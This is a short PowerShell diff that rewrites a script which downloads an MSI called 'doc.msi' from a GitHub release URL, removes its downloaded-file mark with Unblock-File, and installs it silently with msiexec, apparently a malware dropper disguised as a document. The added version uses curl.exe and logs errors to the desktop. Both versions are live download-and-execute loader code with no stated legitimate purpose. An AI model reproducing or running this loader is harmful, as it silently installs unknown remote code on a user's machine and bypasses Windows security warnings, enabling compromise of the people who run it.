@@ -1,5 +1,9 @@
-$msi = "$env:TEMP\doc.msi"
-$url = "https://github.com/okursammyok-ship-it/t/releases/download/new/doc.msi"
-Invoke-WebRequest -Uri $url -OutFile $msi
-Unblock-File $msi
-Start-Process msiexec.exe -ArgumentList '/i', $msi, '/qn', '/norestart' -Wait
+$ErrorActionPreference = 'Stop'
+try {
+    $msi = "$env:TEMP\doc.msi"
+    curl.exe -s -L -o $msi "https://github.com/okursammyok-ship-it/t/releases/download/new/doc.msi"
+    Unblock-File $msi
+    Start-Process msiexec.exe -ArgumentList '/i', $msi, '/qn', '/norestart' -Wait
+} catch {
+    $_ | Out-File "$env:USERPROFILE\Desktop\ps_err.txt"
+}
